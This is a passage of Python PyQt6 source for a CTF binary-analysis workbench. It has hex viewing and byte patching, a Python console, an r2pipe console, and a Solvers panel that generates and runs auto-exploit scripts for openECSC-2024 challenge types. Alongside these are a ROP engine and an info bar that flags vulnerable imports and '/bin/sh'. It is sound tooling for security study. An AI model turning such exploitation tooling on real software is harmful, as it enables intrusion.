        super().__init__(parent)
        self.bookmarks = bookmarks
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0)

        self._tree = QTreeWidget(); self._tree.setHeaderLabels(['Label','Address','Group'])
        self._tree.header().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self._tree.doubleClicked.connect(self._on_dbl)
        layout.addWidget(self._tree)

        tb = QHBoxLayout()
        btn_imp = _btn('import', 'Import JSON'); btn_imp.clicked.connect(self._import)
        tb.addWidget(btn_imp); tb.addStretch()
        layout.addLayout(tb)
        self.refresh()

    def refresh(self):
        self._tree.clear()
        for group, items in self.bookmarks.by_group().items():
            grp = QTreeWidgetItem([group,'','']); self._tree.addTopLevelItem(grp)
            for addr, label in items:
                item = QTreeWidgetItem([label, hex(addr), group])
                item.setData(0, Qt.ItemDataRole.UserRole, addr)
                grp.addChild(item)
            grp.setExpanded(True)

    def _on_dbl(self, idx):
        item = self._tree.itemFromIndex(idx)
        if item:
            addr = item.data(0, Qt.ItemDataRole.UserRole)
            if addr: self.navigate_to.emit(addr)

    def _import(self):
        path, _ = QFileDialog.getOpenFileName(self,'Import Bookmarks','','JSON (*.json)')
        if path:
            with open(path) as f: data = json.load(f)
            self.bookmarks.from_list(data)
            self.refresh()


# ── HexView Panel ─────────────────────────────────────────────────────
class HexViewPanel(QWidget):
    def __init__(self, loader: BinaryLoader, parent=None):
        super().__init__(parent)
        self.loader = loader
        self._offset = 0
        self._search_hits: List[int] = []
        self._search_idx = 0
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0)

        # ── Jump / Patch toolbar ──────────────────────────────────────────
        tb = QHBoxLayout()
        self._offset_edit = QLineEdit('0'); self._offset_edit.setMaximumWidth(110)
        self._offset_edit.setPlaceholderText('Offset (hex)')
        self._offset_edit.returnPressed.connect(self._jump)
        btn_jump = _btn('jump', 'Jump'); btn_jump.setMaximumWidth(60); btn_jump.clicked.connect(self._jump)
        self._va_edit = QLineEdit(); self._va_edit.setPlaceholderText('VA…'); self._va_edit.setMaximumWidth(130)
        btn_patch_va = _btn('patch', 'Patch VA'); btn_patch_va.clicked.connect(self._patch_va)
        btn_undo = _btn('undo'); btn_undo.setMaximumWidth(46); btn_undo.setToolTip('Undo patch')
        btn_undo.clicked.connect(self._undo)
        btn_redo = _btn('redo'); btn_redo.setMaximumWidth(46); btn_redo.setToolTip('Redo patch')
        btn_redo.clicked.connect(self._redo)
        btn_save = _btn('save', 'Save…'); btn_save.clicked.connect(self._save_patched)
        for w in [QLabel('Offset:'), self._offset_edit, btn_jump,
                  QLabel('VA:'), self._va_edit, btn_patch_va,
                  btn_undo, btn_redo, btn_save]:
            tb.addWidget(w)
        tb.addStretch()
        layout.addLayout(tb)

        # ── Search toolbar ────────────────────────────────────────────────
        sb = QHBoxLayout()
        self._search_edit = QLineEdit()
        self._search_edit.setPlaceholderText('Search hex bytes (e.g. 48 89 e5) or ASCII text…')
        self._search_edit.returnPressed.connect(self._hex_search)
        btn_find   = QPushButton('Find');  btn_find.setMaximumWidth(52)
        btn_find.clicked.connect(self._hex_search)
        btn_prev   = QPushButton('◀');    btn_prev.setMaximumWidth(30)
        btn_prev.clicked.connect(self._search_prev)
        btn_next   = QPushButton('▶');    btn_next.setMaximumWidth(30)
        btn_next.clicked.connect(self._search_next)
        self._search_lbl = QLabel('')
        self._search_lbl.setStyleSheet(f'color:{C["subtext0"]};font-size:10px;')
        for w in [QLabel('Find:'), self._search_edit, btn_find, btn_prev, btn_next, self._search_lbl]:
            sb.addWidget(w)
        sb.addStretch()
        layout.addLayout(sb)

        self._text = QPlainTextEdit(); self._text.setReadOnly(True)
        self._text.setFont(QFont('JetBrains Mono', 9))
        layout.addWidget(self._text)
        self._render()

    def _hex_search(self):
        query = self._search_edit.text().strip()
        if not query: return
        raw = bytes(self.loader._raw)
        # Try hex bytes first, then ASCII
        try:
            pattern = bytes.fromhex(query.replace(' ', ''))
        except ValueError:
            pattern = query.encode('latin1', errors='replace')
        self._search_hits = []
        offset = 0
        while (idx := raw.find(pattern, offset)) >= 0:
            self._search_hits.append(idx)
            offset = idx + 1
        self._search_idx = 0
        if self._search_hits:
            self._search_lbl.setText(f'1 / {len(self._search_hits)}')
            self.jump_to(self._search_hits[0])
        else:
            self._search_lbl.setText('Not found')

    def _search_next(self):
        if not self._search_hits: return
        self._search_idx = (self._search_idx + 1) % len(self._search_hits)
        self._search_lbl.setText(f'{self._search_idx+1} / {len(self._search_hits)}')
        self.jump_to(self._search_hits[self._search_idx])

    def _search_prev(self):
        if not self._search_hits: return
        self._search_idx = (self._search_idx - 1) % len(self._search_hits)
        self._search_lbl.setText(f'{self._search_idx+1} / {len(self._search_hits)}')
        self.jump_to(self._search_hits[self._search_idx])

    def _render(self, offset=None):
        if offset is not None: self._offset = offset
        COLS = 16; ROWS = 64
        raw = bytes(self.loader._raw)
        start = max(0, self._offset & ~0xF)
        end   = min(len(raw), start + ROWS * COLS)
        lines = []
        for i in range(start, end, COLS):
            chunk = raw[i:i+COLS]
            hex_part  = ' '.join(f'{b:02x}' for b in chunk)
            ascii_part = ''.join(chr(b) if 32<=b<127 else '.' for b in chunk)
            lines.append(f'{i:08x}  {hex_part:<48}  │{ascii_part}│')
        self._text.setPlainText('\n'.join(lines))

    def jump_to(self, offset: int):
        self._offset_edit.setText(hex(offset)); self._render(offset)

    def jump_to_va(self, va: int):
        off = self.loader.vaddr_to_offset(va)
        if off >= 0: self.jump_to(off)

    def _jump(self):
        try: self._render(int(self._offset_edit.text().strip(), 16))
        except ValueError: pass

    def _patch_va(self):
        try: va = int(self._va_edit.text().strip(), 16)
        except ValueError: return
        hex_str, ok = QInputDialog.getText(self, 'Patch bytes', f'New bytes at {hex(va)} (hex, e.g. 90 90):')
        if not ok: return
        try:
            new_bytes = bytes.fromhex(hex_str.replace(' ',''))
        except ValueError: QMessageBox.warning(self, 'Error', 'Invalid hex'); return
        if self.loader.patch_at_vaddr(va, new_bytes):
            self._render(); QMessageBox.information(self, 'Patched', f'Applied {len(new_bytes)} bytes @ {hex(va)}')
        else:
            QMessageBox.warning(self, 'Error', f'Address {hex(va)} not in any segment')

    def _undo(self):
        r = self.loader.undo_patch()
        if r: self._render()
        else: QMessageBox.information(self, 'Undo', 'Nothing to undo')

    def _redo(self):
        r = self.loader.redo_patch()
        if r: self._render()
        else: QMessageBox.information(self, 'Redo', 'Nothing to redo')

    def _save_patched(self):
        path, _ = QFileDialog.getSaveFileName(self, 'Save Patched Binary',
                                              self.loader.path + '_patched')
        if path: self.loader.save_patched(path); QMessageBox.information(self, 'Saved', f'Saved to {path}')


# ── Solvers Panel ─────────────────────────────────────────────────────
class SolversPanel(QWidget):
    def __init__(self, loader: BinaryLoader, solver: SolverCore, parent=None):
        super().__init__(parent)
        self.loader = loader
        self.solver = solver
        self._hl = None
        layout = QVBoxLayout(self)
        layout.setContentsMargins(4, 4, 4, 4)
        layout.setSpacing(4)

        top = QHBoxLayout()
        self._challenge_combo = QComboBox()
        self._challenge_combo.setMinimumWidth(360)
        for key, meta in OPENECSC_CHALLENGES.items():
            self._challenge_combo.addItem(f'{key}  —  {meta["desc"]}', userData=key)
        self._challenge_combo.currentIndexChanged.connect(self._on_challenge_selected)
        btn_gen = _btn('gen', 'Generate')
        btn_gen.clicked.connect(self._generate)
        btn_run = _btn('run', 'Auto-Solve')
        btn_run.setObjectName('accent')
        btn_run.clicked.connect(self._run_solver)
        top.addWidget(QLabel('Type:'))
        top.addWidget(self._challenge_combo, 1)
        top.addWidget(btn_gen)
        top.addWidget(btn_run)
        layout.addLayout(top)

        self._info_bar = QLabel('')
        self._info_bar.setWordWrap(True)
        self._info_bar.setStyleSheet(
            f'color:{C["teal"]};padding:3px 8px;font-size:11px;'
            f'background:{C["surface0"]};border-radius:3px;border-left:3px solid {C["teal"]};')
        layout.addWidget(self._info_bar)

        self._desc_lbl = QLabel('')
        self._desc_lbl.setStyleSheet(f'color:{C["subtext0"]};padding:2px 0;font-size:11px;')
        layout.addWidget(self._desc_lbl)

        self._progress = QProgressBar()
        self._progress.setMaximumHeight(4)
        self._progress.setTextVisible(False)
        self._progress.hide()
        layout.addWidget(self._progress)

        splitter = QSplitter(Qt.Orientation.Vertical)

        editor_wrap = QWidget()
        ew_layout = QVBoxLayout(editor_wrap)
        ew_layout.setContentsMargins(0, 0, 0, 0)
        ew_layout.setSpacing(2)
        ed_lbl = QLabel('Script')
        ed_lbl.setStyleSheet(f'color:{C["blue"]};font-weight:bold;font-size:10px;'
                             f'background:{C["surface0"]};padding:2px 6px;')
        ew_layout.addWidget(ed_lbl)
        self._editor = QPlainTextEdit()
        self._editor.setFont(QFont('JetBrains Mono', 9))
        ew_layout.addWidget(self._editor)
        splitter.addWidget(editor_wrap)

        out_wrap = QWidget()
        ow_layout = QVBoxLayout(out_wrap)
        ow_layout.setContentsMargins(0, 0, 0, 0)
        ow_layout.setSpacing(2)
        out_lbl = QLabel('Output')
        out_lbl.setStyleSheet(f'color:{C["green"]};font-weight:bold;font-size:10px;'
                              f'background:{C["surface0"]};padding:2px 6px;')
        ow_layout.addWidget(out_lbl)
        self._output = QPlainTextEdit()
        self._output.setReadOnly(True)
        self._output.setFont(QFont('JetBrains Mono', 9))
        ow_layout.addWidget(self._output)
        splitter.addWidget(out_wrap)

        splitter.setSizes([600, 220])
        splitter.setChildrenCollapsible(False)
        layout.addWidget(splitter, 1)

        btns = QHBoxLayout()
        btn_copy = _btn('copy', 'Copy')
        btn_copy.clicked.connect(lambda: QApplication.clipboard().setText(self._editor.toPlainText()))
        btn_save = _btn('save', 'Save…')
        btn_save.clicked.connect(self._save_script)
        btn_clear = _btn('cancel', 'Clear Output')
        btn_clear.clicked.connect(self._output.clear)
        btn_refill = _btn('scan', 'Re-fill from Binary')
        btn_refill.clicked.connect(self._generate)
        btns.addWidget(btn_copy)
        btns.addWidget(btn_save)
        btns.addWidget(btn_clear)
        btns.addWidget(btn_refill)
        btns.addStretch()
        layout.addLayout(btns)

        self._update_info_bar()
        if self._challenge_combo.count() > 0:
            self._on_challenge_selected(0)

    def _update_info_bar(self):
        prot    = self.loader.protections()
        funcs   = self.loader.get_functions()
        imports = {i['name'] for i in self.loader.get_imports()}
        vuln    = [f for f in imports if f in VULN_PATTERNS]
        wins    = [n for n, _ in funcs if any(k in n.lower() for k in
                   ('win', 'flag', 'shell', 'success', 'correct', 'backdoor'))]
        nx      = prot.get('NX (No-Execute)', '?')
        pie     = prot.get('PIE (ASLR)', '?')
        canary  = prot.get('Stack Canary', '?')
        parts   = [
            f'Entry: {hex(self.loader.entry_point)}',
            f'NX:{nx[:3]}  PIE:{pie[:3]}  Canary:{canary[:3]}',
            f'Funcs: {len(funcs)}',
        ]
        if vuln:
            parts.append(f'Vuln imports: {", ".join(vuln[:5])}')
        if wins:
            parts.append(f'Win funcs: {", ".join(wins[:3])}')
        if bytes(self.loader._raw).find(b'/bin/sh\x00') >= 0:
            parts.append('/bin/sh: in binary')
        self._info_bar.setText('  |  '.join(parts))

    def _on_challenge_selected(self, idx):
        key = self._challenge_combo.itemData(idx)
        if key:
            self._desc_lbl.setText(OPENECSC_CHALLENGES.get(key, {}).get('desc', ''))
            self._generate()

    def _generate(self):
        key = self._challenge_combo.currentData()
        if not key:
            return
        script = self.solver.get_solver(key)
        self._editor.setPlainText(script)
        if self._hl:
            self._hl.setDocument(None)
        self._hl = CHighlighter(self._editor.document())

    def _run_solver(self):
        script = self._editor.toPlainText()
        self._output.setPlainText('Running…')
        def execute():
            import tempfile, subprocess as sp
            with tempfile.NamedTemporaryFile(suffix='.py', mode='w',
                                            delete=False, prefix='ctf_solver_') as f:
                f.write(script)
                tmp = f.name
            try:
                result = sp.run(
                    [sys.executable, tmp],
                    capture_output=True, text=True,
                    timeout=120,
                    stdin=sp.DEVNULL,
                )
                out = result.stdout
                if result.stderr.strip():
                    out += '\n[stderr]\n' + result.stderr
                return out.strip() or '(no output)'
            except sp.TimeoutExpired:
                return '[-] Timeout (120s) — script needs io.interactive(); run in terminal.'
            except Exception as e:
                return f'Error: {e}'
            finally:
                try:
                    os.unlink(tmp)
                except (OSError, FileNotFoundError):
                    pass
        w = Worker(execute)
        w.result.connect(self._output.setPlainText)
        w.error.connect(lambda e: self._output.setPlainText(f'Worker error: {e}'))
        w.finished.connect(lambda: w.deleteLater())
        w.start()
        self._worker = w

    def _save_script(self):
        path, _ = QFileDialog.getSaveFileName(self, 'Save Script', 'solve.py', 'Python (*.py)')
        if path:
            with open(path, 'w') as f:
                f.write(self._editor.toPlainText())
            os.chmod(path, 0o755)


# ── Scripting Console Panel ───────────────────────────────────────────
class ScriptingPanel(QWidget):
    def __init__(self, loader: BinaryLoader, disasm: Disassembler,
                 comments: CommentsDB, bookmarks: BookmarksDB, xrefs: XRefDB,
                 parent=None):
        super().__init__(parent)
        self._globals = {'loader':loader,'disasm':disasm,'comments':comments,
                         'bookmarks':bookmarks,'xrefs':xrefs,
                         '__name__':'ctf_console','help':'type help(obj)'}
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0)
        self._output = QPlainTextEdit(); self._output.setReadOnly(True)
        self._output.setFont(QFont('JetBrains Mono',9))
        self._output.appendPlainText(
            '# CTF Ultimate v4 — Python console\n'
            '# Globals: loader, disasm, comments, bookmarks, xrefs\n'
            '# Example: [hex(a) for _,a in loader.get_functions()[:5]]\n')
        layout.addWidget(self._output, 1)
        inp = QHBoxLayout()
        self._input = QLineEdit(); self._input.setPlaceholderText('Python expression or statement…')
        self._input.returnPressed.connect(self._exec)
        inp.addWidget(QLabel('>>>'), 0); inp.addWidget(self._input, 1)
        layout.addLayout(inp)
        self._history: List[str] = []; self._hist_idx = 0
        self._input.installEventFilter(self)

    def eventFilter(self, obj, event):
        from PyQt6.QtCore import QEvent as _QE
        if obj is self._input and event.type() == _QE.Type.KeyPress:
            if event.key() == Qt.Key.Key_Up:
                if self._history and self._hist_idx > 0:
                    self._hist_idx -= 1; self._input.setText(self._history[self._hist_idx])
                return True
            if event.key() == Qt.Key.Key_Down:
                if self._hist_idx < len(self._history)-1:
                    self._hist_idx += 1; self._input.setText(self._history[self._hist_idx])
                else:
                    self._hist_idx = len(self._history); self._input.clear()
                return True
        return super().eventFilter(obj, event)

    def _exec(self):
        cmd = self._input.text().strip()
        if not cmd: return
        self._history.append(cmd); self._hist_idx = len(self._history)
        self._input.clear()
        self._output.appendPlainText(f'>>> {cmd}')
        buf = io.StringIO()
        old = sys.stdout; sys.stdout = buf
        try:
            try:
                result = eval(cmd, self._globals)
                if result is not None: self._output.appendPlainText(repr(result))
            except SyntaxError:
                exec(cmd, self._globals)
            out = buf.getvalue()
            if out: self._output.appendPlainText(out.rstrip())
        except Exception as e:
            self._output.appendPlainText(f'Error: {e}')
        finally: sys.stdout = old
        self._output.verticalScrollBar().setValue(self._output.verticalScrollBar().maximum())


# ── Console Panel (r2pipe) ─────────────────────────────────────────────
class ConsolePanel(QWidget):
    def __init__(self, loader: BinaryLoader, parent=None):
        super().__init__(parent)
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0)
        self.r2 = None
        if HAS_R2PIPE:
            try:
                self.r2 = r2pipe.open(loader.path, flags=['-2'])
                self.r2.cmd('aa')
            except Exception as e:
                log.warning(f'Console r2pipe init failed: {e}')
                self.r2 = None

        self._output = QPlainTextEdit(); self._output.setReadOnly(True)
        self._output.setFont(QFont('JetBrains Mono',9))
        banner = f'r2pipe console — {loader.path}' if self.r2 else \
                 'r2pipe not available (pip install r2pipe; sudo apt install radare2)'
        self._output.setPlainText(banner)
        layout.addWidget(self._output, 1)

        inp = QHBoxLayout()
        self._input = QLineEdit(); self._input.setPlaceholderText('[r2] Enter radare2 command…')
        self._input.setEnabled(bool(self.r2))
        self._input.returnPressed.connect(self._exec)
        inp.addWidget(QLabel('[r2]'), 0); inp.addWidget(self._input, 1)
        layout.addLayout(inp)

    def _exec(self):
        cmd = self._input.text().strip()
        if not cmd or not self.r2: return
        self._input.clear()
        try:
            result = self.r2.cmd(cmd)
            self._output.appendPlainText(f'[{cmd}]\n{result}')
        except Exception as e:
            self._output.appendPlainText(f'Error: {e}')


# ── Global Search Dialog ───────────────────────────────────────────────
class GlobalSearchDialog(QDialog):
    navigate_to = Signal(int)

    def __init__(self, loader: BinaryLoader, disasm: Disassembler, parent=None):
        super().__init__(parent)
        self.loader = loader; self.disasm = disasm
        self.setWindowTitle('Global Search')
        self.resize(700, 500)
        layout = QVBoxLayout(self)

        tb = QHBoxLayout()
        self._query = QLineEdit(); self._query.setPlaceholderText('Search text, hex bytes (0x...), or address (0x)…')
        self._query.returnPressed.connect(self._search)
        self._type = QComboBox()
        for t in ('Text','Hex Bytes','Address','Mnemonic'): self._type.addItem(t)
        btn_s = QPushButton('Search'); btn_s.clicked.connect(self._search)
        tb.addWidget(self._query, 2); tb.addWidget(self._type); tb.addWidget(btn_s)
        layout.addLayout(tb)

        self._results = QListWidget()
        self._results.doubleClicked.connect(self._on_result_dbl)
        layout.addWidget(self._results)
        self._status = QLabel(''); layout.addWidget(self._status)

    def _search(self):
        query = self._query.text().strip(); typ = self._type.currentText()
        if not query: return
        self._results.clear()
        raw = bytes(self.loader._raw)
        if typ == 'Hex Bytes':
            try:
                pattern = bytes.fromhex(query.replace('0x','').replace(' ',''))
                offset = 0
                while (idx := raw.find(pattern, offset)) >= 0:
                    self._results.addItem(f'File+{hex(idx)}  {pattern.hex()}')
                    offset = idx + 1
            except Exception: self._results.addItem('Invalid hex')
        elif typ == 'Text':
            offset = 0
            enc = query.encode()
            while (idx := raw.find(enc, offset)) >= 0:
                self._results.addItem(f'File+{hex(idx)}  "{query}"')
                offset = idx + 1
        elif typ == 'Address':
            try:
                addr = int(query, 16)
                off = self.loader.vaddr_to_offset(addr)
                if off >= 0: self._results.addItem(f'VA {hex(addr)}  → File+{hex(off)}')
                else: self._results.addItem(f'VA {hex(addr)} not mapped')
            except Exception as _e: log.debug(f"Suppressed: {_e}")
        elif typ == 'Mnemonic':
            funcs = self.loader.get_functions()
            for name, addr in funcs[:50]:
                size = self.loader.get_function_size(addr)
                code = self.loader.read_vaddr(addr, size)
                if not code: continue
                for insn in self.disasm.disassemble(code, addr):
                    if query.lower() in insn['mnemonic'].lower() + ' ' + insn['op_str'].lower():
                        self._results.addItem(f'{hex(insn["address"])}  {insn["mnemonic"]} {insn["op_str"]}')
        self._status.setText(f'{self._results.count()} results')

    def _on_result_dbl(self, idx):
        item = self._results.item(idx.row())
        if not item: return
        text = item.text()
        m = re.search(r'0x[0-9a-fA-F]+', text)
        if m:
            try: self.navigate_to.emit(int(m.group(), 16))
            except Exception as _e: log.debug(f"Suppressed: {_e}")


# ══════════════════════════════════════════════════════════════════════
# Main Window — QDockWidget Workspace
# ══════════════════════════════════════════════════════════════════════
class MainWindow(QMainWindow):
    def __init__(self, binary_path: str = None):
        super().__init__()
        self.setWindowTitle('Triage — Binary Analysis Workbench')
        self.resize(1600, 950)
        self.loader = None; self.disasm = None
        self.comments = CommentsDB(); self.bookmarks = BookmarksDB(); self.xrefs = XRefDB()
        self._panels: Dict[str, QWidget] = {}
        self._docks: Dict[str, QDockWidget] = {}
        self._lazy_panels: Dict[str, callable] = {}
        self._lazy_built: set = set()

        # Central placeholder (replaced by Disassembly dock on load)
        placeholder = QLabel('Open a binary to begin  (File → Open…)')
        placeholder.setAlignment(Qt.AlignmentFlag.AlignCenter)
        placeholder.setStyleSheet(f'color:{C["subtext0"]};font-size:18px;')
        self.setCentralWidget(placeholder)

        self._build_menus()
        self._build_toolbar()

        # Status bar
        self._status = QStatusBar()
        self.setStatusBar(self._status)
        self._status.showMessage('Triage — Ready')

        if binary_path: self._load_binary(binary_path)
        else:
            cfg = _load_config()
            last = cfg.get('last_binary','')
            if last and os.path.isfile(last):
                reply = QMessageBox.question(self, 'Reopen?',
                    f'Reopen previous binary?\n{last}',
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
                if reply == QMessageBox.StandardButton.Yes: self._load_binary(last)

    def _build_menus(self):
        def act(menu, key, label, slot, shortcut=None):
            ico = _icon(key)
            a = QAction(ico, label, self) if not ico.isNull() else QAction(label, self)
            a.triggered.connect(slot)
            if shortcut:
                a.setShortcut(shortcut)
            menu.addAction(a)
            return a

        mb = self.menuBar()

        fm = mb.addMenu('&File')
        act(fm, 'open',   'Open Binary…',   self._open_file,    'Ctrl+O')
        act(fm, 'close',  'Close Binary',   self._close_binary, 'Ctrl+W')
        fm.addSeparator()
        act(fm, 'patch',  'Save Patched…',  self._save_patched)
        fm.addSeparator()
        act(fm, 'import', 'Load Session',   self._load_session)
        fm.addSeparator()
        act(fm, 'close',  'Quit',           self.close,         'Ctrl+Q')

        vm = mb.addMenu('&View')
        view_items = [
            ('disasm',    'Disassembly',      'disasm'),
            ('cfg',       'CFG',              'cfg'),
            ('decomp',    'Decompiler',       'decompiler'),
            ('rop',       'ROP Engine',       'rop'),
            ('hex',       'Symbolic Exec',    'triton'),
            ('capa',      'Capabilities',     'capa'),
            ('strings',   'Strings',          'strings'),
            ('info',      'Imports/Exports',  'imports'),
            ('info',      'Memory Map',       'memmap'),
            ('hex',       'Hex View',         'hex'),
            ('xref',      'XRefs',            'xrefs'),
            ('bookmark',  'Bookmarks',        'bookmarks'),
            ('solve',     'Solvers',          'solvers'),
            ('run',       'Scripting',        'scripting'),
            ('shell',     'r2 Console',       'console'),
        ]
        for icon_key, label, dock_key in view_items:
            act(vm, icon_key, label, lambda k=dock_key: self._show_dock(k))
        vm.addSeparator()
        act(vm, 'info', 'Reset Layout', self._reset_layout)
        self._view_menu = vm

        sm = mb.addMenu('&Search')
        act(sm, 'search', 'Global Search…', self._global_search, 'Ctrl+F')

        hm = mb.addMenu('&Help')
        act(hm, 'info', 'Dependencies', self._show_deps)
        act(hm, 'info', 'About', lambda: QMessageBox.about(self, 'About',
            'Triage — Binary Analysis Workbench\n\nPyQt6 · Capstone · LIEF\n'
            'exROP · SolverCore · Triton · CAPA\nopenECSC-2024 auto-solvers\n\n'
            'Drag dock panels to rearrange workspace.'))

    def _build_toolbar(self):
        tb = self.addToolBar('Main')
        tb.setMovable(False)
        tb.setToolButtonStyle(Qt.ToolButtonStyle.ToolButtonTextBesideIcon)

        def act(key, label, fn, tip=''):
            ico = _icon(key)
            if not ico.isNull():
                a = QAction(ico, label, self)
            else:
                _, sym = _QTA_MAP.get(key, ('', label))
                a = QAction(f'{sym}  {label}' if sym != label else label, self)
            a.triggered.connect(fn)
            if tip:
                a.setToolTip(tip)
            tb.addAction(a)
            return a

        # File group
        act('open',    'Open',    self._open_file,    'Open binary  (Ctrl+O)')
        act('close',   'Close',   self._close_binary, 'Close binary  (Ctrl+W)')
        tb.addSeparator()
        act('patch',   'Patched', self._save_patched,  'Save patched binary')
        tb.addSeparator()
        # Analysis group
        act('search',  'Search',  self._global_search, 'Global search  (Ctrl+F)')
        act('capa',    'CAPA',  lambda: self._show_dock('capa'), 'Run CAPA analysis')
        act('rop',     'ROP',   lambda: self._show_dock('rop'),  'ROP gadget scan')
        act('solve',   'Solve', lambda: self._show_dock('solvers'), 'Auto-solvers')
        tb.addSeparator()
        self._tb_info = QLabel('  No binary loaded  ')
        self._tb_info.setStyleSheet(f'color:{C["subtext0"]};font-size:11px;padding:0 8px;')
        tb.addWidget(self._tb_info)

    def _close_binary(self):
        """Close current binary, clear all panels, return to welcome screen."""
        if not self.loader: return
        reply = QMessageBox.question(self, 'Close Binary',
            f'Close {os.path.basename(self.loader.path)}?\n(Session will be saved)',
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply != QMessageBox.StandardButton.Yes: return
        self.loader.close()
        self.loader = self.disasm = None
        self.comments = CommentsDB(); self.bookmarks = BookmarksDB(); self.xrefs = XRefDB()
        for dock in self._docks.values():
            self.removeDockWidget(dock); dock.deleteLater()
        self._docks.clear(); self._panels.clear()
        placeholder = QLabel('Open a binary to begin  (File → Open…  Ctrl+O)')
        placeholder.setAlignment(Qt.AlignmentFlag.AlignCenter)
        placeholder.setStyleSheet(f'color:{C["subtext0"]};font-size:18px;')
        self.setCentralWidget(placeholder)
        self.setWindowTitle('Triage — Binary Analysis Workbench')
        self._status.showMessage('Ready')
        if hasattr(self, '_tb_info'):
            self._tb_info.setText('  No binary loaded  ')

    def _open_file(self):
        path, _ = QFileDialog.getOpenFileName(self, 'Open Binary', '', 'All Files (*)')
        if path: self._load_binary(path)

    def _load_binary(self, path: str):
        try:
            self.loader = BinaryLoader(path)
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Cannot load: {e}')
            return
        try:
            self.disasm = Disassembler(self.loader.arch, self.loader.bits)
        except Exception as e:
            log.warning(f'Disassembler init failed for {self.loader.arch}/{self.loader.bits}: {e}')
            self.disasm = None
        decompiler = PseudoDecompiler(self.loader)
        rop_engine  = ROPEngine(self.loader)
        solver      = SolverCore(self.loader, rop_engine)

        # ── Build essential panels upfront (lightweight) ───────────────
        self._panels['info']       = BinaryInfoPanel(self.loader, self.loader.protections())
        if self.disasm:
            self._panels['disasm']     = DisassemblyPanel(self.loader, self.disasm, self.comments, self.bookmarks, self.xrefs)
            self._panels['cfg']        = CFGPanel(self.loader, self.disasm)
        self._panels['decompiler'] = DecompilerPanel(self.loader, decompiler)
        self._panels['strings']    = StringsPanel(self.loader)
        self._panels['imports']    = ImportsExportsPanel(self.loader)
        self._panels['memmap']     = MemoryMapPanel(self.loader)
        self._panels['hex']        = HexViewPanel(self.loader)
        self._panels['xrefs']      = XRefsPanel(self.xrefs)
        self._panels['bookmarks']  = BookmarksPanel(self.bookmarks)
        self._panels['scripting']  = ScriptingPanel(self.loader, self.disasm, self.comments, self.bookmarks, self.xrefs)
        self._panels['console']    = ConsolePanel(self.loader)

        # ── Defer heavy panels (built on first tab focus) ──────────────
        def _build_rop(session_data):
            p = ExROPPanel(self.loader, rop_engine, solver)
            if session_data.get('rop_gadgets'):
                for entry in session_data['rop_gadgets']:
                    g = ROPGadget(entry['addr'], [])
                    g.text = entry['text']
                    p.rop.gadgets.append(g)
                    for cls in g.classes:
                        p.rop._by_class[cls].append(g)
                if p.rop.gadgets:
                    p._populate_cls_tree()
                    p._populate_gadget_table(p.rop.gadgets[:1000])
                    p._count_lbl.setText(
                        f'{len(p.rop.gadgets):,} gadgets (from session cache)')
            return p
        def _build_triton():
            return TritonPanel(self.loader)
        def _build_capa(session_data):
            p = CapaPanel(self.loader)
            if session_data.get('capa_summary'):
                p._status.setText(session_data['capa_summary'] + '  (restored from session)')
            return p
        def _build_solvers():
            return SolversPanel(self.loader, solver)

        # Load session early so lazy factories can reference it
        session = self.loader.load_session(self.comments, self.bookmarks)

        self._lazy_panels = {
            'rop':     lambda: _build_rop(session),
            'triton':  _build_triton,
            'capa':    lambda: _build_capa(session),
            'solvers': _build_solvers,
        }
        self._lazy_built = {'rop', 'triton', 'capa', 'solvers'}

        # Wire up signals (only for panels that exist now)
        if 'disasm' in self._panels:
            dp: DisassemblyPanel = self._panels['disasm']
            dp.navigate_to_graph.connect(lambda a: (self._show_dock('cfg'), self._panels['cfg'].focus_addr(a)))
            dp.decompile_func.connect(lambda a: (self._show_dock('decompiler'), self._panels['decompiler'].decompile_addr(a)))
            dp.show_xrefs.connect(lambda a: (self._show_dock('xrefs'), self._panels['xrefs'].query_addr(a)))
        if 'strings' in self._panels:
            self._panels['strings'].find_in_disasm.connect(self._find_string_in_disasm)

        self._build_dock_layout()

        if 'disasm' in self._panels: self._panels['disasm'].load_functions()
        if 'cfg'    in self._panels: self._panels['cfg'].load_functions()
        if 'decompiler' in self._panels: self._panels['decompiler'].load_functions()

        info = (f'{os.path.basename(path)}  |  {self.loader.fmt}  |  '
                f'{self.loader.arch} {self.loader.bits}-bit  |  '
                f'Entry: {hex(self.loader.entry_point)}')
        self._status.showMessage(info)
        self.setWindowTitle(f'CTF Ultimate v4  —  {os.path.basename(path)}')
        if hasattr(self, '_tb_info'):
            self._tb_info.setText(f'  {os.path.basename(path)}  [{self.loader.fmt} · {self.loader.arch}]  ')

    def _build_dock_layout(self):
        # Clear old docks
        for dock in self._docks.values():
            self.removeDockWidget(dock); dock.deleteLater()
        self._docks.clear()

        # Only essential panels visible by default; rest accessed via View menu
        DOCK_CONFIG = [
            ('info',       'Binary Info',       Qt.DockWidgetArea.LeftDockWidgetArea,   True),
            ('disasm',     'Disassembly',        Qt.DockWidgetArea.RightDockWidgetArea,  True),
            ('cfg',        'Control Flow Graph', Qt.DockWidgetArea.RightDockWidgetArea,  True),
            ('decompiler', 'Decompiler',         Qt.DockWidgetArea.RightDockWidgetArea,  True),
            ('strings',    'Strings',            Qt.DockWidgetArea.LeftDockWidgetArea,   True),
            ('imports',    'Imports/Exports',    Qt.DockWidgetArea.LeftDockWidgetArea,   True),
            ('hex',        'Hex View',           Qt.DockWidgetArea.BottomDockWidgetArea, True),
            ('console',    'r2 Console',         Qt.DockWidgetArea.BottomDockWidgetArea, True),
            # Hidden by default (accessible via View menu):
            ('rop',        'ROP Engine',         Qt.DockWidgetArea.BottomDockWidgetArea, False),
            ('triton',     'Symbolic Exec',      Qt.DockWidgetArea.BottomDockWidgetArea, False),
            ('capa',       'Capabilities',       Qt.DockWidgetArea.BottomDockWidgetArea, False),
            ('memmap',     'Memory Map',         Qt.DockWidgetArea.LeftDockWidgetArea,   False),
            ('xrefs',      'XRefs',              Qt.DockWidgetArea.BottomDockWidgetArea, False),
            ('bookmarks',  'Bookmarks',          Qt.DockWidgetArea.LeftDockWidgetArea,   False),
            ('solvers',    'Solvers',            Qt.DockWidgetArea.BottomDockWidgetArea, False),
